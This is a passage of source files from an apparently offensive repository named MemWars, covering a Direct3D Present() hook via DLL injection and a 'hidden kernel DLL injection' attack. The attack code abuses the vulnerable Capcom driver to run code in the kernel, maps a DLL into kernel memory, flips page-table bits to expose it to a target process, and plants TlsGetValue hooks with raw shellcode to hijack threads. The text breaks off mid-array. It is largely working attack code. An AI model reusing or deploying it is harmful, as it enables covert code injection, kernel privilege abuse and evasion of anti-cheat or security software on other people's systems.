                           CW_USEDEFAULT, CW_USEDEFAULT, rc.right - rc.left, rc.bottom - rc.top, NULL, NULL, hInstance,
                           NULL );
    if( !g_hWnd )
        return E_FAIL;

    ShowWindow( g_hWnd, nCmdShow );

    return S_OK;
}


//--------------------------------------------------------------------------------------
// Called every time the application receives a message
//--------------------------------------------------------------------------------------
LRESULT CALLBACK WndProc( HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam )
{
    PAINTSTRUCT ps;
    HDC hdc;

    switch( message )
    {
        case WM_PAINT:
            hdc = BeginPaint( hWnd, &ps );
            EndPaint( hWnd, &ps );
            break;

        case WM_DESTROY:
            PostQuitMessage( 0 );
            break;

        default:
            return DefWindowProc( hWnd, message, wParam, lParam );
    }

    return 0;
}


//--------------------------------------------------------------------------------------
// Create Direct3D device and swap chain
//--------------------------------------------------------------------------------------
HRESULT InitDevice()
{
    HRESULT hr = S_OK;

    RECT rc;
    GetClientRect( g_hWnd, &rc );
    UINT width = rc.right - rc.left;
    UINT height = rc.bottom - rc.top;

    UINT createDeviceFlags = 0;
#ifdef _DEBUG
    createDeviceFlags |= D3D11_CREATE_DEVICE_DEBUG;
#endif

    D3D_DRIVER_TYPE driverTypes[] =
    {
        D3D_DRIVER_TYPE_HARDWARE,
        D3D_DRIVER_TYPE_WARP,
        D3D_DRIVER_TYPE_REFERENCE,
    };
    UINT numDriverTypes = ARRAYSIZE( driverTypes );

    D3D_FEATURE_LEVEL featureLevels[] =
    {
        D3D_FEATURE_LEVEL_11_0,
        D3D_FEATURE_LEVEL_10_1,
        D3D_FEATURE_LEVEL_10_0,
    };
	UINT numFeatureLevels = ARRAYSIZE( featureLevels );

    DXGI_SWAP_CHAIN_DESC sd;
    ZeroMemory( &sd, sizeof( sd ) );
    sd.BufferCount = 1;
    sd.BufferDesc.Width = width;
    sd.BufferDesc.Height = height;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = g_hWnd;
    sd.SampleDesc.Count = 1;
    sd.SampleDesc.Quality = 0;
    sd.Windowed = TRUE;

    for( UINT driverTypeIndex = 0; driverTypeIndex < numDriverTypes; driverTypeIndex++ )
    {
        g_driverType = driverTypes[driverTypeIndex];
        hr = D3D11CreateDeviceAndSwapChain( NULL, g_driverType, NULL, createDeviceFlags, featureLevels, numFeatureLevels,
                                            D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &g_featureLevel, &g_pImmediateContext );
        if( SUCCEEDED( hr ) )
            break;
    }
    if( FAILED( hr ) )
        return hr;

    // Create a render target view
    ID3D11Texture2D* pBackBuffer = NULL;
    hr = g_pSwapChain->GetBuffer( 0, __uuidof( ID3D11Texture2D ), ( LPVOID* )&pBackBuffer );
    if( FAILED( hr ) )
        return hr;

    hr = g_pd3dDevice->CreateRenderTargetView( pBackBuffer, NULL, &g_pRenderTargetView );
    pBackBuffer->Release();
    if( FAILED( hr ) )
        return hr;

    g_pImmediateContext->OMSetRenderTargets( 1, &g_pRenderTargetView, NULL );

    // Setup the viewport
    D3D11_VIEWPORT vp;
    vp.Width = (FLOAT)width;
    vp.Height = (FLOAT)height;
    vp.MinDepth = 0.0f;
    vp.MaxDepth = 1.0f;
    vp.TopLeftX = 0;
    vp.TopLeftY = 0;
    g_pImmediateContext->RSSetViewports( 1, &vp );

    return S_OK;
}


//--------------------------------------------------------------------------------------
// Render the frame
//--------------------------------------------------------------------------------------
void Render()
{
    // Just clear the backbuffer
    float ClearColor[4] = { 0.0f, 0.125f, 0.3f, 1.0f }; //red,green,blue,alpha
    g_pImmediateContext->ClearRenderTargetView( g_pRenderTargetView, ClearColor );
    g_pSwapChain->Present( 0, 0 );
}


//--------------------------------------------------------------------------------------
// Clean up the objects we've created
//--------------------------------------------------------------------------------------
void CleanupDevice()
{
    if( g_pImmediateContext ) g_pImmediateContext->ClearState();

    if( g_pRenderTargetView ) g_pRenderTargetView->Release();
    if( g_pSwapChain ) g_pSwapChain->Release();
    if( g_pImmediateContext ) g_pImmediateContext->Release();
    if( g_pd3dDevice ) g_pd3dDevice->Release();
}

```

`AttackServices/Direct3D11HookAttack/README.md`:

```md
# Direct3D 11 Hook Attack



This attack is based on a DLL injection to hook the Direct3D functions of a process.



First, within the DLL [D3D11CreateDeviceAndSwapChain](https://msdn.microsoft.com/de-de/library/windows/desktop/ff476083%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396) creates a Direct3D device. 

This device has a virtual address table. 

The game process already has its own Direct3D device, which is why our device now shares the virtual address table with this device. 


So we can now change the pointers in the virtual address table of the game and thus hook popular Direct3D functions.



In this attack the Direct3D method "Present()" is hooked.



The library [PolyHook](https://github.com/stevemk14ebr/PolyHook) is used to change the pointers in the Virtual Address Table.


```

`AttackServices/Direct3D11HookAttack/Resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Tutorial01.rc
//

#define IDS_APP_TITLE           103

#define IDR_MAINFRAME           128
#define IDD_TUTORIAL1_DIALOG    102
#define IDD_ABOUTBOX            103
#define IDM_ABOUT               104
#define IDM_EXIT                105
#define IDI_TUTORIAL1           107
#define IDI_SMALL               108
#define IDC_TUTORIAL1           109
#define IDC_MYICON              2
#define IDC_STATIC              -1
// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS

#define _APS_NO_MFC                 130
#define _APS_NEXT_RESOURCE_VALUE    129
#define _APS_NEXT_COMMAND_VALUE     32771
#define _APS_NEXT_CONTROL_VALUE     1000
#define _APS_NEXT_SYMED_VALUE       110
#endif
#endif

```

`AttackServices/Direct3D11HookAttack/buildDLL.bat`:

```bat
@ECHO OFF
cl.exe /EHsc /LD Direct3DHookDLL.cpp /I"C:\Program Files (x86)\Microsoft DirectX SDK (June 2010)\Include" /link /LTCG /LIBPATH:"C:\Program Files (x86)\Microsoft DirectX SDK (June 2010)\Lib\x64" /LIBPATH:"C:\Users\marius\git\MemWars\libs\Capstone\msvc\x64\Release" user32.lib d3d11.lib d3dx11.lib
```

`AttackServices/Direct3D11HookAttack/buildDirect3DHookTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc Direct3DHookTest.cpp Direct3DHook.cpp ../DLLInjectionAttack/Injector.cpp ../../Core/MemWarsCore.c /link user32.lib Advapi32.lib Shlwapi.lib
```

`AttackServices/Direct3D11HookAttack/buildTestApp.bat`:

```bat
@ECHO OFF
cl.exe Direct3DTestApp.cpp /I"C:\Program Files (x86)\Microsoft DirectX SDK (June 2010)\Include" /link /LIBPATH:"C:\Program Files (x86)\Microsoft DirectX SDK (June 2010)\Lib\x64" user32.lib d3d11.lib d3dx11.lib
```

`AttackServices/HiddenKernelDLLInjectionAttack/AttackTest.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include "../../Core/MemWarsCore.h"
#include "../../Core/MemWarsServicesCore.h"
#include "Injector.h"

using namespace std;

NON_PAGED_CODE void __stdcall Test(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {

}

void DriverLoadingTest() {

    if (!LockMemorySections()) {
        cout << "DriverLoadingTest failed. LockMemorySections failed" << endl;
    }

    DecryptDriver();

    if (RemoveSimilarDrivers(CAPCOM_DRIVER) != STATUS_SUCCESS) {
		printf("DriverLoadingTest failed. Failed to remove similar drivers!\n");
		return;
	}
    
    wstring driverName = CreateDriverName();
	globalCapcomDriverName = driverName;
    
    if (!CreateDriverFile(driverName.c_str())) {
		cout << "DriverLoadingTest failed. CreateDriverFile failed" << endl;
        return;
    }

    BOOLEAN alreadyEnabled = FALSE;
    if (RtlAdjustPrivilege(SeLoadDriverPrivilege, 1ull, AdjustCurrentProcess, &alreadyEnabled) != STATUS_SUCCESS && !alreadyEnabled) {
		cout << "DriverLoadingTest failed. RtlAdjustPrivilege failed" << endl;
        return;
    }
    
    if (AddServiceToRegistry(driverName.c_str()) != STATUS_SUCCESS) {
		cout << "DriverLoadingTest failed. AddServiceToRegistry failed" << endl;
        return;
    }
    
    wstring sourceRegistry = wstring(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") + driverName;

    UNICODE_STRING sourceRegistryUnicode = {0};
    sourceRegistryUnicode.Buffer = (wchar_t*) sourceRegistry.c_str();
    sourceRegistryUnicode.Length = (sourceRegistry.size()) * 2;
    sourceRegistryUnicode.MaximumLength = (sourceRegistry.size() + 1) * 2;

    cout << "about to call NtLoadDriver..." << endl;
    system("PAUSE");

    NTSTATUS status = NtLoadDriver(&sourceRegistryUnicode);
    printf("NtLoadDriver(%ls) returned %08x\n", sourceRegistry.c_str(), status);

    cout << "about to open device..." << endl;
    system("PAUSE");
    HANDLE device = OpenDevice("Htsysm72FB");

    CapcomCodePayload* codePayload = (CapcomCodePayload*)VirtualAlloc(nullptr, sizeof(CapcomCodePayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    BYTE codePayloadBuf[] = {
        0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 ; Skip 8 bytes, this puts the UserFunction into RAX
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // UserFunction address will be here
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, userData
        0x58,                                                       // POP RAX
        0xFF, 0x20                                                  // JMP [RAX]
    };

    *(ULONGLONG*)(codePayloadBuf + 5) = (ULONGLONG)Test;
    *(ULONGLONG*)(codePayloadBuf + 15) = (ULONGLONG)0;

    codePayload->pointerToPayload = codePayload->payload;

    ZeroMemory(codePayload->payload, PAYLOAD_BUFFER_SIZE);
    CopyMemory(codePayload->payload, codePayloadBuf, sizeof(codePayloadBuf));

    cout << "about to send iotcl..." << endl;
    system("PAUSE");
    status = 0x0;
    DWORD bytesReturned = 0x0;
    DeviceIoControl(device, IOCTL_RunPayload64, &codePayload->pointerToPayload, sizeof(ULONG_PTR), &status, sizeof(status), &bytesReturned, 0);
    printf("DeviceIoControl returned %08x\n", status);

    UnloadDriver(driverName.c_str());
    RemoveDriverFromRegistry(driverName.c_str());
}


void LoadingStressTest() {
    for (int i = 0; i < 100; i++) {
        if (!InitDriver()) {
            cout << "LoadingStressTest failed loading after " << i << " iterations" << endl;
            break;
        }
        InitKernelFunctions();
        RunInKernel(GetPhysicalMemoryData, NULL);
        if (!UnloadCapcomDriver()) {
            cout << "LoadingStressTest failed unloading after " << i << " iterations" << endl;
            break;
        }
        // cout << i << endl;
        // Sleep(2000);
        if (i == 99) {
            cout << "LoadingStressTest success" << endl;
        }
    }
}


void HiddenKernelDLLInjectionAttackTest() {

    system("start /B TestApp.exe");
    HANDLE hProcess = NULL;
    while (hProcess == NULL) {
        hProcess = (HANDLE)GetProcessByName("TestApp.exe");
    }

    int status = MapDLLIntoKernel("InjectedDLL.dll");
    if (status != 0) {
        cout << "MapDLLIntoKernel() failed" << endl;
        cout << "Error: " << status << endl;
    }
    status = InjectDLLIntoProcess("TestApp.exe");
    if (status != 0) {
        cout << "InjectDLLIntoProcess() failed" << endl;
        cout << "Error: " << status << endl;
    } else {
        cout << "HiddenKernelDLLInjectionAttack() success" << endl;
    }
    
    system("taskkill /IM TestApp.exe /F >nul");
}

int main() {
    // DriverLoadingTest();
    // LoadingStressTest();
    HiddenKernelDLLInjectionAttackTest();
    
}
```

`AttackServices/HiddenKernelDLLInjectionAttack/Injector.h`:

```h
#pragma once
#include <windows.h>
#include <Psapi.h>
#include <string>
#include <stdio.h>
#include "MemoryController.h"
#include "../CapcomDriverAttack/CapcomWrapper.h"
#include "KernelDLLMapper.h"

using namespace std;

struct ALLOCATE_DATA {
    SIZE_T size;
    PVOID memPtr = NULL;
};

void __stdcall AllocateKernelMemory(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    ALLOCATE_DATA* pData = (ALLOCATE_DATA*)userData;
    pData->memPtr = (ALLOCATE_DATA*)CallWithInterruptsAndSmep(
        ExAllocatePool,
        0ull, 
        pData->size
   );
}

PVOID AllocateKernelMemory(SIZE_T size) {
    PVOID buf;
    ALLOCATE_DATA data;
    data.size = size;
    RunInKernel(AllocateKernelMemory, &data);
    buf = data.memPtr;
    return buf;
}

BOOL ExposeKernelMemoryToProcess(PVOID memory, SIZE_T size, uint64_t eProcess) {

    SetTargetEProcess(eProcess);
    BOOL success = TRUE;

    IterPhysRegion(memory, size, [&](PVOID va, uint64_t pa, SIZE_T sz) {
		auto info = QueryPageTableInfo(va);

		info.Pml4e->user = TRUE;
		info.Pdpte->user = TRUE;
		info.Pde->user = TRUE;

		if (!info.Pde || (info.Pte && (!info.Pte->present))) {
			success = FALSE;
		}
		else {
			if (info.Pte) {
                info.Pte->user = TRUE;
            }
		}
	});

    UnsetEProcess();
    
    return success;
}

PUCHAR FindKernelPadSinglePage(PUCHAR start, SIZE_T size) {
	PUCHAR it = start;

	MEMORY_BASIC_INFORMATION mbi;

	PUCHAR streakStart = 0;
	int streak = 0;

	do {
		if ((0x1000 - (uint64_t(it) & 0xFFF)) < size) {
			it++;
			continue;
		}

		if (*it == 0) {
			if (!streak) {
                streakStart = it;
            }
			streak++;
		}
		else {
			streak = 0;
			streakStart = 0;
		}

		if (streak >= size) {
            return streakStart;
        }

		VirtualQuery(it, &mbi, sizeof(mbi));

		it++;
	}
	while ((mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_EXECUTE_WRITECOPY));
	return 0;
}

PUCHAR _TlsGetValue;
PUCHAR target;
TlsLockedHookStatus* hookStatus;
vector<std::pair<PVOID, SIZE_T>> usedRegions;
int MapDLLIntoKernel(string dllPath) {

    if (!InitMemoryController()) {
        return 1;
    }

    // Not &TlsGetValue to avoid __imp intermodule calls
    _TlsGetValue = (PUCHAR)GetProcAddress(GetModuleHandleA("KERNEL32"), "TlsGetValue");
    if (*_TlsGetValue != 0xE9 && *_TlsGetValue != 0xEB) {
        UnloadCapcomDriver();
        return 2;
    }
	// PUCHAR target;
    if (*_TlsGetValue == 0xEB) {
        target = (_TlsGetValue + 2 + *(int8_t*) (_TlsGetValue + 1));
    } else {
        target = (_TlsGetValue + 5 + *(int32_t*) (_TlsGetValue + 1));
    }

    // TlsLockedHookStatus* hookStatus;
    PVOID memory;
    // vector<std::pair<PVOID, SIZE_T>> usedRegions;
    BOOL success = MapDllToKernel(dllPath, _TlsGetValue, target, TRUE, [&](SIZE_T size) {
        memory = AllocateKernelMemory(size);
		ExposeKernelMemoryToProcess(memory, size, currentEProcess);
		ZeroMemory(memory, size);
		usedRegions.push_back({memory, size});
		return memory;
    });
    UnloadCapcomDriver();
    if (!success) {
        return 3;
    }
    hookStatus = (TlsLockedHookStatus*)memory;
	return 0;
}

int InjectDLLIntoProcess(string processName) {
    uint64_t pid = 0;
	for (int i = 0; i < 200; i++) {
		pid = FindProcess(processName);
		Sleep(10);
	}
    if (!pid) {
        return 4;
    }
	// cout << "found " << processName.data() << ". Pid " << pid << endl;

    uint64_t eProcess = FindEProcess(pid);
	if (!eProcess) {
        return 5;
    }
    // cout << "EProcess: " << hex << eProcess << dec <<endl;

	// Expose region to process
	for (auto region : usedRegions) {
		// cout << "Exposing " << region.first << " (" << region.second << " bytes) to pid: " << pid << endl;
		ExposeKernelMemoryToProcess(region.first, region.second, eProcess);
	}

    vector<BYTE> pidBasedHook = {
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,        // mov rax, gs:[0x30]
		0x8B, 0x40, 0x40,                                            // mov eax,[rax+0x40] ; pid
		0x3D, 0xDD, 0xCC, 0xAB, 0x0A,                                // cmp eax, 0xAABCCDD
		0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,                          // jne 0xAABBCC
		0x48, 0xB8, 0xAA, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA, 0x00, 0x00,  // mov rax, 0xAABBCCDDEEAA
		0xFF, 0xE0                                                   // jmp rax
	};

	PUCHAR padSpace = FindKernelPadSinglePage(_TlsGetValue, pidBasedHook.size());

	if (!padSpace) {
        return 6;
    }

	// printf("Hooking TlsGetValue @                   %16llx\n", (uint64_t)_TlsGetValue);
	// printf("TlsGetValue Redirection Target:         %16llx\n", (uint64_t)target);
	// printf("Stub located at:                        %16llx\n", (uint64_t)padSpace);
	// printf("Image located at:                       %16llx\n", (uint64_t)hookStatus);

	*(uint32_t*)(&pidBasedHook[ 0xD ]) = pid; // Pid
	*(int32_t*)(&pidBasedHook[ 0x13 ]) = target - (padSpace + 0x17); // Jmp
	*(PUCHAR*)(&pidBasedHook[ 0x19 ]) = &hookStatus->entryBytes; // Hook target
    
    BYTE jmp[5];
	jmp[0] = 0xE9;
	*(int32_t*)(jmp + 1) = padSpace - (_TlsGetValue + 5);

	vector<BYTE> backup1(pidBasedHook.size(), 0);
	vector<BYTE> backup2(5, 0);

	hookStatus->numThreadsWaiting = 0;
	hookStatus->isFree = FALSE;

	UnsetEProcess();

    auto AssertCoW = [&](PVOID page) {
		VirtualLock(page, 0x1);

		PSAPI_WORKING_SET_EX_INFORMATION ws;
		ws.VirtualAddress = page;
		QueryWorkingSetEx(HANDLE(-1), &ws, sizeof(ws));

		if (!ws.VirtualAttributes.Shared) {
            __noop("Page Not CoW");
        }
		VirtualUnlock(page, 0x1);
	};

    // check maching memory checks AND is CoW check 

	// cout << "Writing stub to padding..." << endl;
	AssertCoW(padSpace);
	SetTargetEProcessIfCanRead(eProcess, padSpace);
	ReadVirtual(padSpace, backup1.data(), pidBasedHook.size());
	WriteVirtual(pidBasedHook.data(), padSpace, pidBasedHook.size());

	// cout << "Writing the hook to TlsGetValue..." << endl;
	AssertCoW(_TlsGetValue);
	SetTargetEProcessIfCanRead(eProcess, _TlsGetValue);
	ReadVirtual(_TlsGetValue, backup2.data(), 5);
	WriteVirtual(jmp, _TlsGetValue, 5);

	// cout << "Hooked! Waiting for threads to spin..." << endl;

	// Wait for threads to lock
	for (int i = 0; i < 500; i++) {
		// !ReadVirtual<BYTE>(&hookStatus->numThreadsWaiting)) {
        Sleep(1);
    }

		
	// cout << "Threads spinning: " << (int)hookStatus->numThreadsWaiting << endl;

	// // Restore Backup
	SetTargetEProcessIfCanRead(eProcess, _TlsGetValue);
	WriteVirtual(backup2.data(), _TlsGetValue, 5);
	
	int ret;
	if (hookStatus->numThreadsWaiting) {
		ret = 0;
    //    cout << "Unhooked and started thread hijacking!" << endl;
    } else {
		ret = 7;
        // cout << "ERROR: Wait timed out..." << endl;
    }

	hookStatus->isFree = TRUE;

	SetTargetEProcessIfCanRead(eProcess, padSpace);
	WriteVirtual(backup1.data(), padSpace, pidBasedHook.size());

	// TODO write more test cases for the driver to increase robustness

    return ret;
}


```

`AttackServices/HiddenKernelDLLInjectionAttack/KernelDLLMapper.h`:

```h
#pragma once
#include <Windows.h>
#include <fstream>
#include <vector>
#include <functional>
#include <string>

using namespace std;

struct TlsLockedHookStatus {
	BYTE isFree;
	BYTE numThreadsWaiting;
	BYTE entryBytes;
};

static vector<BYTE> ReadFile(const string& path) {
	ifstream stream(path, ios::binary | ios::ate);
	ifstream::pos_type pos = stream.tellg();

	if (pos == (ifstream::pos_type) - 1) {
        return {};
    }

	vector<BYTE> data(pos);
	stream.seekg(0, ios::beg);
	stream.read((char*) &data[0], pos);

	return data;
}

static void* RvaToPointer(BYTE* image, DWORD va) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)image;
	PIMAGE_NT_HEADERS fileHeader = (PIMAGE_NT_HEADERS)((uint64_t)dosHeader + dosHeader->e_lfanew);

	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(((ULONG_PTR) &fileHeader->OptionalHeader) + fileHeader->FileHeader.SizeOfOptionalHeader);

	for (int i = 0; i < fileHeader->FileHeader.NumberOfSections; i++) {
		char* name = (char*) sectionHeader[i].Name;
		DWORD rawData = sectionHeader[i].PointerToRawData;
		DWORD virtualAddress = sectionHeader[i].VirtualAddress;
		DWORD rawSize = sectionHeader[i].SizeOfRawData;
		DWORD virtualSize = sectionHeader[i].Misc.VirtualSize;

		if (va >= virtualAddress && va < (virtualAddress + virtualSize)) {
			return image + va - virtualAddress + rawData;
		}
	}
	return image + va;
}

static void PushBytes(vector<BYTE>& target, const vector<BYTE>& bytes) {
	int i = target.size();
	target.resize(i + bytes.size());
	memcpy(&target[i], &bytes[0], bytes.size());
}

static vector<BYTE> CreateImportShell(BYTE* image, PVOID mappedAdr, bool loadLib) {

	vector<BYTE> out = { 
		0x48, 0x83, 0xEC, 0x38,                                       // sub    rsp,0x38
		0x4C, 0x8D, 0x3D, 0xDD, 0xCC, 0xBB, 0x00,                     // lea r15, [rip+0xBBCCDD]
		0x48, 0xB8, 0xAA, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA, 0x00, 0x00,   // mov rax, 0xAABBCCDDEEAA ; GetModuleHandleA // LoadLibraryA?
		0x49, 0x89, 0xC5,                                             // mov r13, rax
		0x48, 0xB8, 0xAA, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA, 0x00, 0x00,   // mov rax, 0xAABBCCDDEEAA ; GetProcAddress
		0x49, 0x89, 0xC4                                              // mov r11, rax
	};

	*(FARPROC*)&out[0xD] = loadLib ? GetProcAddress(GetModuleHandleA("KERNEL32"), "LoadLibraryA") : GetProcAddress(GetModuleHandleA("KERNEL32"), "GetModuleHandleA"); // avoding __imp's
	*(FARPROC*)&out[0x1A] = GetProcAddress(GetModuleHandleA("KERNEL32"), "GetProcAddress");   // avoding __imp's

	vector<BYTE> dataContainer = {};

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)image;
	PIMAGE_NT_HEADERS fileHeader = (PIMAGE_NT_HEADERS)((uint64_t)dosHeader + dosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER optionalHeader = &fileHeader->OptionalHeader;

    

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)RvaToPointer(
		image,
		fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
	);

    

	while (importDescriptor && importDescriptor->Name && fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
		PCHAR moduleName = (PCHAR)RvaToPointer(image, importDescriptor->Name);

		IMAGE_THUNK_DATA* thunk = NULL;
		IMAGE_THUNK_DATA* func = NULL;

		uint32_t moduleNameOffset = dataContainer.size();

		do {
            dataContainer.push_back(*moduleName);
        }
		while (*moduleName++);

		vector<BYTE> modulePusher = { 
			0x49, 0x8D, 0x8F, 0xBB, 0xAA, 0x00, 0x00,  // lea    rcx,[r15+0xaabb]
			0x41, 0xFF, 0xD5,                          // call   r13
			0x48, 0x89, 0xC6                           // mov    rsi,rax
		};

		*(uint32_t*) (&modulePusher[3]) = moduleNameOffset;

		PushBytes(out, modulePusher);

		if (importDescriptor->OriginalFirstThunk) {
			thunk = (IMAGE_THUNK_DATA*)RvaToPointer(image, importDescriptor->OriginalFirstThunk);
			func = (IMAGE_THUNK_DATA*)((PUCHAR) mappedAdr + importDescriptor->FirstThunk);
		}
		else {
			thunk = (IMAGE_THUNK_DATA*)RvaToPointer(image, importDescriptor->FirstThunk);
			func = (IMAGE_THUNK_DATA*)((PUCHAR) mappedAdr + importDescriptor->FirstThunk);
		}

		for (; thunk->u1.AddressOfData; thunk++, func++) {
			// assert(!(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64));
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                vector<BYTE> failed;
                return failed;
            }

			FARPROC functionAddress = NULL;
			IMAGE_IMPORT_BY_NAME* imageImportByName = (IMAGE_IMPORT_BY_NAME*)RvaToPointer(image, *(DWORD*) thunk);
			PCHAR importName = (PCHAR)imageImportByName->Name;
			ULONGLONG* target = &func->u1.Function;

			uint32_t importNameOffset = dataContainer.size();

			if (!strcmpi(importName, "AddVectoredExceptionHandler")){
                cout << "WARNING: Vectored Exception Handling IS NOT SUPPORTED!" << endl;
            }

			do {
                dataContainer.push_back(*importName);
            }
			while (*importName++);

			uint32_t offsetOffset = dataContainer.size();
			dataContainer.resize(dataContainer.size() + 8);
			*(uint64_t*)(&dataContainer[offsetOffset]) = (uint64_t)target;

			vector<BYTE> importFixer = { 
				0x48, 0x89, 0xF1,                          // mov    rcx,rsi
				0x49, 0x8D, 0x97, 0xBB, 0xAA, 0x00, 0x00,  // lea    rdx,[r9+0xaabb]
				0x41, 0xFF, 0xD4,                          // call   r12
				0x49, 0x8B, 0x9F, 0xBB, 0xAA, 0x00, 0x00,  // mov    rbx,QWORD PTR [r9+0xaabb]
				0x48, 0x89, 0x03                           // mov    QWORD PTR [rbx],rax
			};

			*(uint32_t*)(&importFixer[6]) = importNameOffset;
			*(uint32_t*)(&importFixer[16]) = offsetOffset;

			PushBytes(out, importFixer);
		}
		importDescriptor++;
	}

	PushBytes(out, { 0x48, 0x83, 0xC4, 0x38 }); // add rsp, 0x38
	uint32_t jmpSize = out.size();
	PushBytes(out, { 0xE9, 0x00, 0x00, 0x00, 0x00 }); // jmp 0xAABBCCDD
	*(uint32_t*) (&out[7]) = out.size() - 0xB;
	PushBytes(out, dataContainer);
	*(int32_t*) (&out[jmpSize + 1]) = dataContainer.size();
	return out;
}

static void RelocateImage(BYTE* image, BYTE* target) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)image;
	PIMAGE_NT_HEADERS fileHeader = (PIMAGE_NT_HEADERS) ((uint64_t)dosHeader + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(((ULONG_PTR) &fileHeader->OptionalHeader) + fileHeader->FileHeader.SizeOfOptionalHeader);

	// Copy sections
	memcpy(target, image, 0x1000); // Pe Header

	for (int i = 0; i < fileHeader->FileHeader.NumberOfSections; i++) {
		char* name = (char*)sectionHeader[i].Name;
		uint64_t rawData = sectionHeader[i].PointerToRawData;
		uint64_t virtualAddress = sectionHeader[i].VirtualAddress;
		uint64_t rawSize = sectionHeader[i].SizeOfRawData;
		uint64_t virtSize = sectionHeader[i].Misc.VirtualSize;
		ZeroMemory(target + virtualAddress, virtSize);
		memcpy(target + virtualAddress, image + rawData, rawSize);

		if (!strcmpi(name, ".pdata")) {
            // cout << "WARNING: Structured Exception Handling IS NOT SUPPORTED!" << endl;
        }
		if (!strcmpi(name, ".tls")) {
            // cout << "WARNING: Thread-local Storage IS NOT SUPPORTED!" << endl;
        }
	}

	// Reloc sections
	if (fileHeader->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC &&
		 fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0) {

		PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION) (target + fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		DWORD relocSize = fileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		uint64_t delta = (uint64_t)target - fileHeader->OptionalHeader.ImageBase;
		int c = 0;
		while (c < relocSize) {
			size_t p = sizeof(IMAGE_BASE_RELOCATION);
			LPWORD chains = (LPWORD) ((PUCHAR) reloc + p);
			while (p < reloc->SizeOfBlock) {
				uint64_t base = (uint64_t) (target + reloc->VirtualAddress);
				switch (*chains >> 12) {
					case IMAGE_REL_BASED_HIGHLOW:
						*(uint32_t*) (base + (*chains & 0xFFF)) += (uint32_t)delta;
						break;
	 				case IMAGE_REL_BASED_DIR64:
						*(uint64_t*) (base + (*chains & 0xFFF)) += delta;
						break;
				}
				chains++;
				p += sizeof(WORD);
			}
			c += reloc->SizeOfBlock;
			reloc = (PIMAGE_BASE_RELOCATION) ((PBYTE) reloc + reloc->SizeOfBlock);
		}
	}
}


BOOL MapDllToKernel(const string& path, PVOID valCheck, PVOID hookOut, bool loadLib, const function<PVOID(SIZE_T)>& KernelMemoryAllocator) {

    auto file = ReadFile(path);
    if (file.size() == 0) {
        return FALSE;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)file.data();
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS fileHeader = (PIMAGE_NT_HEADERS)((uint64_t)dosHeader + dosHeader->e_lfanew);
    if (fileHeader->Signature != IMAGE_NT_SIGNATURE || fileHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        return FALSE;
    }

	PIMAGE_OPTIONAL_HEADER optionalHeader = &fileHeader->OptionalHeader;
	if (optionalHeader->Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return FALSE;
    }

    vector<BYTE> prologue = { 
		0x00, 0x00, // data
		0xF0, 0xFE, 0x05, 0xF8, 0xFF, 0xFF, 0xFF,                     // lock inc byte ptr [rip-n]
		                                                              // wait_lock:
		0x80, 0x3D, 0xF0, 0xFF, 0xFF, 0xFF, 0x00,                     // cmp byte ptr [rip-m], 0x0
		0xF3, 0x90,                                                   // pause
		0x74, 0xF5,                                                   // je wait_lock

		0x48, 0xB8, 0xAA, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA, 0x00, 0x00,   // mov rax, 0xAABBCCDDEEAA
		                                                              // data_sync_lock:
